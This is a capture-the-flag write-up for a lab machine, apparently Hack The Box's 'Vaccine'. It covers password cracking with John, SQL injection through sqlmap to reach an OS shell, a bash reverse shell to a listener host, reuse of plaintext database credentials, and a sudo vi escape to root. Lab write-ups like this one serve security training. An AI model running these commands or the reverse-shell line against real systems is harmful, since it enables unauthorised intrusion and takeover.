# Vaccine

- Target Machine: 10.10.10.46

## Nmap scan

```bash
[exyss@exyss Starting Point]$ nmap -sC -sV 10.10.10.46 -oN nmap/initial.log 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-06 16:40 CEST
Nmap scan report for 10.10.10.46
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.81 seconds
```

### Getting the source code

We can see that there is an FTP server instance running. We can connect to this server using the credentials found in the last challenge: `ftpuser / mc@F1l3ZilL4` (you can use a CLI FTP client or FileZilla). Once we connect to the FTP server, we can download the file `backup.zip` on our local machine.

The .zip file is password protected, but we can try to bruteforce it using John The Ripper.

```bash
[exyss@exyss Vaccine]$ zip2john backup.zip > hash_backup

[exyss@exyss Vaccine]$ john hash_backup -w=/home/exyss/Desktop/rockyou.txt
```

The cracked password is `741852963`. Now we can unzip the file.
In the index.php file we can see the credential check used in the login.

```php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

We can see that we have to enter the password with the same md5 hash. We can find this using again John The Ripper.

```bash
[exyss@exyss Vaccine]$ echo "2cb42f8734ea607eefed3b70af13bbd3" > hash_pass

[exyss@exyss Vaccine]$ john hash_pass -w=/home/exyss/Desktop/rockyou.txt --format=raw-md5
```

The cracked password is `querty789`. We can now login on the website.

## Getting a Revshell

Once we have logged in on the website, we get redirected to a dashboard page containing a searchbox and a table with some data. We can try to run an SQL injection by typing `'` in the search box, getting the error message `ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^`, meaning that we can exploit this vulnerability.

We can run sqlmap to test well-known exploits and get a reverse shell 

```bash
[exyss@exyss Vaccine]$ sqlmap -u http://10.10.10.46/dashboard.php?search=a --cookie="PHPSESSID=hoomdbmemthn15ekparlkaequo" --os-shell

.
.
.
[18:37:34] [INFO] fingerprinting the back-end DBMS operating system
[18:37:35] [INFO] the back-end DBMS operating system is Linux
[18:37:35] [INFO] testing if current user is DBA
[18:37:36] [INFO] retrieved: '1'
[18:37:36] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[18:37:36] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> whoami
[18:40:54] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[18:40:54] [INFO] retrieved: 'postgres'

os-shell> ls /home
do you want to retrieve the command standard output? [Y/n/a] n
[18:38:19] [INFO] retrieved: 'ftpuser'
[18:38:19] [INFO] retrieved: 'simon'
```

We can see that we are logged in as `postgres` and that there is an home folder for the users `ftpuser` (the one that we used earlier) and `simon`.

We can now spawn a complete reverse shell (instead of this nerfed one) by opening a netcat listener on port 1234 and by running `bash -c "bash -i >& /dev/tcp/10.10.15.78/1234 0>&1"`

## Priviledge escalation

Once we have connected, we can search through the filesystem to find something interesting.
First, we can check the website source code, particularly dashboard.php, so we can we can find the  postgress credentials used to connect to the DBMS

```php
<?php
        session_start();
        if($_SESSION['login'] !== "true") {
          header("Location: index.php");
          die();
        }
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }
```

Once we have this user's password, we can check with `sudo -l` which actions can this user do.
__ATTENTION__: first you have to spawn a TTY shell in order to use sudo. To learn how, check the previous challenge.

```bash
postgres@vaccine:/var/www/html$ sudo -l
sudo -l
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

postgres@vaccine:/var/www/html$ ls -la /bin/vi
ls -la /bin/vi
lrwxrwxrwx 1 root root 20 Oct 17  2019 /bin/vi -> /etc/alternatives/vi
```

By using `ls -la` we can see that `/bin/vi` is owned by root, but the user `postgres` is also allowed to run it while editing `pg_hba.conf`. This means that we can run vi and then spawn a root shell by running `:!/bin/bash` while inside vi. The root flag can be found in the root folder